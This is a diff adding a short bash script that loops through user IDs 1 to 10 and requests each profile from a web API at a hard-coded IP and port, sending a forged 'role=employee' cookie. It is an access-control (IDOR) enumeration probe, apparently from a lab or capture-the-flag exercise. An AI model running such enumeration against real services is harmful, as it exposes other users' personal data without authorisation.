@@ -1,0 +1,10 @@
+#!/bin/bash
+# Destination-Server
+SERVER_IP="94.237.59.180"
+PORT="58561"
+
+# Initiate IDs and send GET-Request
+for uid in {1..10}; do
+    echo "Testing UID $uid..."
+    curl -s "http://$SERVER_IP:$PORT/profile/api.php/profile/$uid" -H "Cookie: role=employee"
+done
